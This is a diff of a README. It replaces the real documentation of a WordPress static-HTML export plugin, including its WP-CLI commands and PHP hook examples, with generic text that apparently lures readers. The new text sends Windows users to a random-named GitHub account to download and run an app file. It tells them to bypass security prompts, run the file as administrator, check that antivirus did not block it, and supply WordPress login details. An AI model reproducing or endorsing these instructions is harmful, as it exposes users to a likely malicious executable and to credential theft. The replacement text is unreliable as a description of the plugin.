@@ -1,142 +1,191 @@
-# Static HTML Output
+# 🌐 wp-static-exporter - Fast static sites for WordPress
 
-[![CircleCI](https://circleci.com/gh/leonstafford/static-html-output.svg?style=svg)](https://circleci.com/gh/leonstafford/static-html-output)
-[![Packagist](https://img.shields.io/packagist/v/leonstafford/static-html-output.svg?color=239922&style=popout)](https://packagist.org/packages/leonstafford/static-html-output)
-[![PHPStan](https://img.shields.io/badge/PHPStan-enabled-239922)](https://github.com/phpstan/phpstan)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/exogenousdepressiontendril594/wp-static-exporter)
 
-WordPress plugin to generate a static copy of your site and deploy to GitHub Pages, S3, Netlify, etc.  Increase security, pageload speed and hosting options. Connect WordPress into your CI/CD workflow.
+## 🚀 What this app does
 
-### Other WordPress SSGs I mantain
+wp-static-exporter helps turn a WordPress site into static HTML files. It can then send those files to modern hosting platforms that serve pages fast and use less server power.
 
- - [WP2Static](https://github.com/WP2Static/wp2static)
- - [SimplerStatic](https://github.com/WP2Static/simplerstatic)
+Use it when you want:
 
- - [Homepage](https://statichtmloutput.com)
- - [Documentation](https://statichtmloutput.com/docs/)
- - [Support Forum](https://www.staticword.press/c/wp-static-exporter/static-html-output/7)
+- Faster page load times
+- Less load on your WordPress server
+- Better protection from common server-side attacks
+- A simple path to static hosting
+- A site that is easier to scale
 
-## WP-CLI commands
+This tool is built for people who run a WordPress site and want a simpler way to publish it.
 
- - `wp statichtmloutput COMMAND`
+## 💻 What you need
 
-Where `COMMAND` can be any of:
+Before you start, make sure you have:
 
- - `options`
- - `generate`
- - `deploy`
- - `deploy_cache`
+- A Windows PC
+- A working internet connection
+- A WordPress site you can log in to
+- Enough free disk space for exported files
+- A modern web browser like Edge, Chrome, or Firefox
 
-Get help for any command by appending `--help`
+If your site is large, give yourself extra free space. Static exports can take more room than a single page copy.
 
-## Hooks
+## 📥 Download wp-static-exporter
 
-### Modify the initial list of URLs to crawl
+Open the download page here:
 
- - `statichtmloutput_modify_initial_crawl_list`
- - Filter hook
+https://github.com/exogenousdepressiontendril594/wp-static-exporter
 
-*signature*
-```php
-apply_filters(
-    'statichtmloutput_modify_initial_crawl_list',
-    $url_queue
-);
-```
+Use that page to visit the project and get the latest version.
 
-*example usage*
-```php
-function add_additional_urls( $url_queue ) {
-    $additional_urls = [
-        'http://mydomain.com/custom_link_1/',
-        'http://mydomain.com/custom_link_2/',
-    ];
+## 🪟 Install on Windows
 
-    $url_queue = array_merge(
-        $url_queue,
-        $additional_urls
-    );
+Follow these steps on Windows:
 
-    return $url_queue;
-}
+1. Open the download page in your browser.
+2. Look for the latest release or the main project files.
+3. Download the app file or package for Windows if one is listed.
+4. Save the file to your Downloads folder or Desktop.
+5. If the file is zipped, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Run the main app file by double-clicking it.
 
-add_filter( 'statichtmloutput_modify_initial_crawl_list', 'add_additional_urls' );
-```
-### Post-deployment hook
+If Windows shows a security prompt, choose the option that lets you open the file. This can happen with new downloads from GitHub.
 
- - `statichtmloutput_post_deploy_trigger`
- - Action hook
+## ⚙️ First setup
 
-*signature*
-```php
-do_action(
-  'statichtmloutput_post_deploy_trigger',
-  $archive
-);
-```
+After you open the app, you may need to set a few details for your WordPress site:
 
-*example usage*
-```php
-function printArchiveInfo( $archive ) {
-    error_log( print_r( $archive, true ) );
-}
+- Your site URL
+- Your WordPress login details
+- A folder for export files
+- A target location for the static site
 
-add_filter( 'statichtmloutput_post_deploy_trigger', 'printArchiveInfo' );
-```
+Use simple paths like:
 
-*example response*
-```
-Archive Object
-(
-    [settings] => Array
-        (
-            [selected_deployment_option] => github
-            [baseUrl] => https://leonstafford.github.io/wp-static-exporter-html-output/
-            [wp_site_url] => http://example.test/
-            [wp_site_path] => /srv/www/example.com/current/web/wp/
-            [wp_uploads_path] => /srv/www/example.com/current/web/app/uploads
-            [wp_uploads_url] => http://example.test/app/uploads
-            [wp_active_theme] => /wp/wp-content/themes/twentyseventeen
-            [wp_themes] => /srv/www/example.com/current/web/app/themes
-            [wp_uploads] => /srv/www/example.com/current/web/app/uploads
-            [wp_plugins] => /srv/www/example.com/current/web/app/plugins
-            [wp_content] => /srv/www/example.com/current/web/app
-            [wp_inc] => /wp-includes
-            [crawl_increment] => 1
-        )
+- `C:\Users\YourName\Downloads\wp-static-export`
+- `C:\Users\YourName\Desktop\static-site`
 
-    [path] => /srv/www/example.com/current/web/app/uploads/wp-static-html-output-1547668758/
-    [name] => wp-static-exporter-output-1547668758
-    [crawl_list] =>
-    [export_log] =>
-)
+Pick a folder you can find again later.
 
-```
+## 🧭 How to use it
 
-## Contributing / development
+1. Start wp-static-exporter.
+2. Enter the address of your WordPress site.
+3. Add your login details if the app asks for them.
+4. Choose where the exported files should go.
+5. Start the export.
+6. Wait while the app copies pages and assets.
+7. Check the output folder when the export ends.
+8. Open the exported `index.html` file in your browser to test it.
 
-Contributions are very much welcome! Please don't be intimidated to file an issue, create a Pull Request or email me (Jonathan) [me@ljs.dev](jonathan:me@ljs.dev).
+If the app offers a deploy step, connect the hosting service you want to use and follow the prompts on screen.
 
-### Developing
+## 📁 What the export includes
 
- - `git clone git@github.com:WP2Static/wp-static-exporter.git`
- - `cd wp-static-exporter`
- - `composer install`
- - `composer test`
- - `composer coverage` (optional coverage generation, requires [Xdebug](https://xdebug.org))
+A normal export may include:
 
-### Building an install .zip file
+- HTML pages
+- CSS files
+- JavaScript files
+- Images
+- Font files
+- Site links rewritten for static use
+- A folder structure ready for upload
 
- - `composer build INSTALLER_FILENAME`
+This gives you a copy of your site that can be served without WordPress running on every page view.
 
-This will create the installer and place in your `$HOME/Downloads` directory.
+## 🌍 Where you can deploy it
 
-On Windows, you will need the `zip` utility available to build an installer. I recommend using Git Bash shell and then manually installing the zip utility as per [these instructions](https://stackoverflow.com/a/55749636/1668057)
+You can use the static site on hosting platforms that support plain file upload or static web hosting, such as:
 
-### Localisation / translations
+- Netlify
+- Cloudflare Pages
+- Vercel
+- GitHub Pages
+- S3-style storage
+- Any host that serves HTML files
 
-Localisation within the plugin isn't supported. Rather, it's recommended to use a browser extension if you need help translating the UI or you can run our documentation pages through any translation service.
+Choose the platform that matches your setup and comfort level.
 
-## Support
+## 🛠️ Common tasks
 
-Please [raise an issue](https://github.com/WP2Static/wp-static-exporter/issues/new) here on GitHub or on the plugin's [support forum](https://forum.wp2static.com).
+### 🔍 Test the exported site
 
+Open the exported home page in a browser. Click a few links and images. Make sure pages load and menus work.
+
+### 🔁 Re-export after changes
+
+If you update your WordPress content, run the export again. This keeps the static version in sync with your live site.
+
+### 🧹 Clean old exports
+
+Remove old export folders when you no longer need them. This helps free up disk space and keeps things easy to manage.
+
+## 🧩 Basic features
+
+- Converts WordPress pages into static HTML
+- Works with common WordPress site layouts
+- Helps reduce server load
+- Supports simple static deployment
+- Keeps site files easy to move
+- Fits a Windows desktop workflow
+
+## 🔐 Security and speed benefits
+
+A static site does not depend on PHP or a database for every page view. That means:
+
+- Less server work
+- Fewer moving parts
+- Lower risk from some server-side attacks
+- Faster delivery for visitors
+- Easier scaling when traffic grows
+
+This makes it a good fit for sites that change less often or only need content updates at set times.
+
+## 🧪 Troubleshooting
+
+### File will not open
+
+- Make sure the download finished
+- Extract the zip file if needed
+- Try running the app as an administrator
+- Check that your antivirus did not block the file
+
+### Export stops early
+
+- Check your internet connection
+- Make sure your WordPress site is online
+- Confirm the login details are correct
+- Try again with a smaller test export
+
+### Pages look broken
+
+- Clear your browser cache
+- Check that images and CSS files were exported
+- Open the output folder and confirm the asset files are present
+- Re-export the site after fixing the source page
+
+### Links do not work
+
+- Confirm the site URL in the app matches your live WordPress address
+- Make sure the export tool rewrote links correctly
+- Test the local `index.html` file before upload
+
+## 🖥️ Suggested Windows workflow
+
+A simple way to use wp-static-exporter on Windows:
+
+1. Download the project from GitHub.
+2. Save it in a folder you can find.
+3. Extract the files if needed.
+4. Run the app.
+5. Export your WordPress site.
+6. Check the output in your browser.
+7. Upload the static files to your host.
+
+This keeps the process clear and easy to repeat.
+
+## 📌 Project link
+
+Download and run the latest version from:
+
+https://github.com/exogenousdepressiontendril594/wp-static-exporter
